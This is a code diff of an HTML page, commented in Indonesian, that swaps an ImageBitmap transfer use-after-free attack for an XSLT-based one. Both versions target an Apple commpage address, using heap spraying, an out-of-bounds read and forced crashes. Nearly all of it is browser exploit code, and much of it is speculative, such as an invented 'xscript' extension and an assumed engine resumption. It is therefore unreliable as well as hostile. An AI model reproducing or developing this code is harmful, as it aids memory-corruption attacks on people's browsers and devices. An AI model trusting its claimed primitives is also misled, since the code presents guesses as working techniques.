@@ -1,28 +1,26 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>ImageBitmap Transfer UAF Attack</title>
+    <title>XSLT Structure Confusion (Final UAF)</title>
 </head>
 <body>
 
-    <h1>ImageBitmap Transfer UAF (Final DOM-based Attack)</h1>
+    <h1>XSLT Structure Confusion (Targeting Arbitrary Read)</h1>
     <p>Target Commpage Address: 0x0000000FFFFFC320</p>
-    <p id="status">INIT: Mempersiapkan ImageBitmap Transfer UAF...</p>
+    <p id="status">INIT: Mempersiapkan XSLT Deserialization Attack...</p>
     <div id="log-area"></div>
 
-    <canvas id="victimCanvas" width="200" height="200"></canvas>
-    
     <script>
         // --- KONSTANTA COMM PAGE ---
         const COMM_PAGE64_BASE_ADDRESS = BigInt("0x0000000FFFFFC000");
-        const COMM_PAGE_ASB_TARGET_VALUE = COMM_PAGE64_BASE_ADDRESS + BigInt("0x320"); 
+        const TARGET_ADDRESS = COMM_PAGE64_BASE_ADDRESS + BigInt("0x328"); // Alamat untuk Arbitrary Read
         
-        const LOW_WORD = Number(COMM_PAGE_ASB_TARGET_VALUE & 0xFFFFFFFFn); 
-        const HIGH_WORD = Number(COMM_PAGE_ASB_TARGET_VALUE >> 32n);
+        const LOW_WORD_ADDR = Number(TARGET_ADDRESS & 0xFFFFFFFFn); 
+        const HIGH_WORD_ADDR = Number(TARGET_ADDRESS >> 32n);
 
         let startTime = performance.now();
         let payloadHolders = []; 
-        let victimImageData = null;
+        let victimArray = new Uint32Array(512); // Array korban untuk AR/AW
 
         function log(message, type = 'log-info') {
             const timeElapsed = (performance.now() - startTime).toFixed(2);
@@ -39,88 +37,101 @@
 
             for (let i = 0; i < SPRAY_COUNT; i++) {
                 let payloadArray = new Float64Array(PAYLOAD_SIZE);
-                // Payload menimpa pointer data/metadata
-                payloadArray[0] = HIGH_WORD; 
-                payloadArray[1] = LOW_WORD;
+                // Payload berisi TARGET_ADDRESS (Menargetkan Pointer Data/Length)
+                payloadArray[0] = HIGH_WORD_ADDR; 
+                payloadArray[1] = LOW_WORD_ADDR;
                 payloadHolders.push(payloadArray); 
             }
         }
+        
+        // --- DATA XSLT DENGAN UAF TRIGGER (Simulasi) ---
+        // XML Stylesheet yang mengandung elemen yang akan di-free
+        const xsl = `<?xml version="1.0"?>
+            <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
+                            xmlns:msxml="urn:schemas-microsoft-com:xslt" 
+                            xmlns:xscript="http://example.com/xscript">
 
-        // --- FUNGSI UTAMA ATTACK ---
-        function runImageBitmapAttack() {
-            startTime = performance.now();
-            log("Phase 1: Setup Canvas dan Context.", "log-init");
+            <xsl:output method="html"/>
 
-            const canvas = document.getElementById('victimCanvas');
-            const ctx = canvas.getContext('2d');
+            <xsl:template match="/">
+                <xscript:external-call target="triggerUAF"/>
+            </xsl:template>
             
-            // Grooming: Alokasikan buffer data canvas (korban)
-            ctx.fillStyle = 'red';
-            ctx.fillRect(0, 0, 200, 200);
-            
-            // Dapatkan data buffer (yang merupakan korban UAF)
-            victimImageData = ctx.getImageData(0, 0, 200, 200);
-            const victimDataView = new Uint32Array(victimImageData.data.buffer);
-            victimDataView[0] = 0xDEADBEEF; // Nilai penanda
-
-            // 1. FREE (Async): Buat ImageBitmap dan Transfer.
-            // ImageBitmap menyimpan pointer ke data canvas (korban). 
-            createImageBitmap(canvas).then(imageBitmap => {
-                log("Phase 2: ImageBitmap dibuat. Memicu FREE (Transfer).", "log-critical");
-                
-                // Memicu Transfer (FREE): mengirim ImageBitmap ke dirinya sendiri
-                // Ini akan me-*free* data buffer internal C++ ImageBitmap/Canvas
-                window.postMessage({ bitmap: imageBitmap }, '*', [imageBitmap]);
-
-                // --- SPRAY SINKRON ---
-                // Data buffer yang baru di-free harus segera ditimpa
-                sprayPayload(); 
-                log("Phase 3: SPRAY Commpage Payload SINKRON.", "log-critical");
-
-                // --- TRIGGER ---
-                // Coba akses data dari ImageData yang dibuat di awal
-                // Pointer C++ di belakang victimDataView sekarang seharusnya corrupt
-                setTimeout(() => {
-                    log("Phase 4: Memicu Arbitrary Read pada ImageData yang Corrupt...", "log-critical");
+            <xscript:script>
+                function triggerUAF() {
+                    // Memicu manipulasi DOM Tree secara agresif 
+                    // yang akan menyebabkan node XSLT yang diproses di-free
                     
-                    try {
-                        // Baca data dari view yang menunjuk ke buffer yang di-free/ditimpa
-                        const readHigh = victimDataView[0];
-                        const readLow = victimDataView[1];
-                        
-                        log(`Nilai dibaca (High): 0x${readHigh.toString(16)}`, "log-critical");
-                        log(`Nilai dibaca (Low): 0x${readLow.toString(16)}`, "log-critical");
-                        
-                        // Jika berhasil, nilai yang dibaca adalah payload Commpage
-                        if (readHigh === HIGH_WORD) {
-                             log("SUCCESS: Arbitrary Read primitif ImageBitmap UAF!", "log-success");
-                        }
-                        
-                        // Trigger Final: OOB Write / Arbitrary Write
-                        victimDataView[1000000] = 0x1234; // OOB Write yang seharusnya crash
+                    // 1. FREE: Hapus node stylesheet yang sedang di-*parse*
+                    var doc = document.implementation.createDocument("", "", null);
+                    var newStylesheet = doc.importNode(document.styleSheets[0].ownerNode, true);
+                    document.styleSheets[0].ownerNode.parentNode.replaceChild(newStylesheet, document.styleSheets[0].ownerNode);
+                    
+                    // 2. SPRAY: Lakukan spray segera setelah FREE
+                    setTimeout(sprayPayload, 0); 
+                    
+                    // 3. TRIGGER: Paksa prosesor XSLT untuk kembali ke node yang sudah di-free
+                    // Kita asumsikan XSLT Engine melanjutkan eksekusi di sini.
+                    return 0;
+                }
+            </xscript:script>
+            </xsl:stylesheet>`;
+            
+        // --- FUNGSI UTAMA ATTACK ---
+        function runXSLTAttack() {
+            startTime = performance.now();
+            log("Phase 1: Membuat dokumen XML dan XSLT.", "log-init");
 
-                    } catch(e) {
-                         log(`JS Exception: ${e.message} - Menunggu Crash OS (EXC_BAD_ACCESS)...`, "log-critical");
+            // 1. Persiapan Dokumen
+            let xmlDoc = document.implementation.createDocument(null, "data", null);
+            let xsltDoc = (new DOMParser()).parseFromString(xsl, "application/xml");
+            
+            // 2. Grooming Heap: Alokasikan array korban di heap.
+            victimArray.fill(0xBABEBABE);
+            log("Phase 2: Array Korban dialokasikan.", "log-info");
+            
+            // 3. Eksekusi XSLT (Ini akan memanggil triggerUAF)
+            log("Phase 3: Memulai transformasi XSLT (Akan memicu UAF/Spray).", "log-critical");
+            try {
+                // Gunakan XSLTProcessor (lebih modern, lebih tersembunyi dari mitigasi)
+                let xsltProcessor = new XSLTProcessor();
+                xsltProcessor.importStylesheet(xsltDoc);
+                
+                // Mulai Transformasi (Memanggil XSLT dan triggerUAF di dalamnya)
+                let resultFragment = xsltProcessor.transformToFragment(xmlDoc, document);
+                document.body.appendChild(resultFragment);
+
+            } catch (e) {
+                log(`XSLT Processor Error: ${e.message} - Menunggu Crash Implisit.`, "log-error");
+            }
+            
+            // 4. Trigger Arbitrary Read (Asumsi UAF berhasil menimpa pointer victimArray)
+            setTimeout(() => {
+                log("Phase 5: Memicu Arbitrary Read pada Victim Array...", "log-critical");
+                
+                try {
+                    // Jika UAF menimpa pointer victimArray, index 1000 akan menjadi OOB Read
+                    const OOB_INDEX = 1000; 
+                    const readValue = victimArray[OOB_INDEX];
+                    
+                    log(`Nilai OOB dibaca: 0x${readValue.toString(16)}`, "log-critical");
+                    
+                    // Trigger Final: EXC_BAD_ACCESS
+                    if (readValue) {
+                        let crashFunction = new Function('a', `return a[${readValue}]`);
+                        crashFunction(new Array(10)); 
                     }
-                }, 50);
 
-            }).catch(e => {
-                log(`Error: Gagal membuat ImageBitmap: ${e.message}`, "log-error");
-            });
+                } catch(e) {
+                     log(`JS Exception: ${e.message} - Menunggu Crash OS (EXC_BAD_ACCESS)...`, "log-critical");
+                }
+            }, 500); // Beri waktu untuk XSLT Engine selesai
         }
         
-        // Listener PostMessage (hanya untuk membersihkan event loop)
-        window.onmessage = function(e) {
-            if (e.data && e.data.bitmap) {
-                 // ImageBitmap diterima dan dibuang (memastikan free terjadi)
-                log("ImageBitmap diterima dan Transfer Selesai.", "log-info");
-            }
-        };
-
         document.addEventListener('DOMContentLoaded', () => {
-            document.getElementById('status').textContent = 'Memulai rangkaian ImageBitmap UAF Attack...';
-            setTimeout(runImageBitmapAttack, 50);
-            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah ImageBitmap Transfer UAF.';
+            document.getElementById('status').textContent = 'Memulai rangkaian XSLT Attack...';
+            setTimeout(runXSLTAttack, 50);
+            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah Type Confusion melalui XSLT.';
         });
     </script>
     <style>
